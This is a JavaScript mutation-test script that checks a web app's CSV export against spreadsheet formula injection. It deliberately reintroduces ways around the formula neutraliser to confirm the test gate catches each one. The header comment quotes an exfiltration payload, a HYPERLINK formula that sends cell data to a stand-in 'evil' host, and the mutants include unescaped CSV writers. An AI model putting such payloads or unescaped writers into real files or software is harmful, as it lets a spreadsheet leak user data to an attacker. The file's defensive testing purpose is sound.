#!/usr/bin/env node
/*
 * CAN csv-import.test.mjs SEE A CSV GO OUT LIVE AGAIN?
 *
 * The rule — lib/import/csv-parse.ts — is that a payload is defused on
 * the way IN and escaped on the way OUT, "because either alone leaves a
 * hole". The gate drove ONE exporter, lib/download/table-csv.ts, which
 * honours it. lib/data-analysis/store.ts carried a second toCsv that did
 * not, and api/data-analysis/[id]/export served it: a cell beginning
 * `=`, `@` or `+`/`-` reached the user's Excel and executed there, and
 * the data-analysis upload stores rows verbatim, so a supplier's price
 * list carrying `=HYPERLINK("http://evil/?"&A1,"Click")` went in and came
 * back out whole. The duplicate is gone; section 10 now ranges over two
 * derived populations instead of one remembered file.
 *
 * Each mutant puts back one way out of the rule.
 *
 * Run: node scripts/tests/csv-safety.mutation.mjs
 */
import { runMutations } from "./lib/mutation-runner.mjs";

const GATE = "scripts/tests/csv-import.test.mjs";
const EXPORTER = "src/lib/download/table-csv.ts";
const ROUTE = "src/app/api/data-analysis/[id]/export/route.ts";
const PARSER = "src/lib/import/csv-parse.ts";

const MUTANTS = [
  {
    name: "the one exporter stops defusing and only quotes",
    file: EXPORTER,
    from: "const str = typeof value === \"number\" ? String(value) : neutraliseFormula(String(value));",
    to: "const str = String(value ?? \"\");",
    expect: "the exported cell does not start a formula",
  },
  {
    // The shape that actually shipped: a route that builds its own CSV.
    name: "the data-analysis route goes back to a CSV of its own",
    file: ROUTE,
    from: "    const csv = toCSV((analysis.headers ?? []) as string[], (analysis.rows ?? []) as string[][]);",
    to: "    const q = (v: string) => (/[\",\\n\\r]/.test(v) ? `\"${v.replace(/\"/g, '\"\"')}\"` : v);\n    const csv = [((analysis.headers ?? []) as string[]).map(q).join(\",\")].concat(((analysis.rows ?? []) as string[][]).map((r) => r.map((v) => q(String(v ?? \"\"))).join(\",\"))).join(\"\\n\");",
    expect: "everything that hands out a CSV builds it with the one exporter",
  },
  {
    name: "the neutraliser stops neutralising, so every writer that calls it is a pass-through",
    file: PARSER,
    from: "  if (/^[=+\\-@]/.test(stripped)) return ` ${stripped}`;",
    to: "  if (/^[=+\\-@]/.test(stripped)) return stripped;",
    expect: "the exported cell does not start a formula",
  },
  {
    // The detector, not a file: a rule that says yes to everything looks
    // exactly like a rule that is being obeyed.
    name: "the server detector counts an upload accept list as serving",
    file: GATE,
    from: "const SERVES_CSV = /Content-Type[\"']?\\s*[:,]\\s*[\"'`]text\\/csv|type:\\s*[\"'`]text\\/csv/;",
    to: "const SERVES_CSV = /text\\/csv/;",
    expect: "and no to an upload accept list",
  },
  {
    name: "the writer detector stops recognising a CSV cell escaper",
    file: GATE,
    from: "const CSV_QUOTE = /replace\\(\\/\"\\/g,\\s*.\"\"./;",
    to: "const CSV_QUOTE = /this-matches-nothing-at-all/;",
    expect: "the detector says yes to a CSV cell escaper",
  },
];

runMutations({ name: "csv-safety", gate: GATE, targets: [GATE, EXPORTER, ROUTE, PARSER], mutants: MUTANTS });
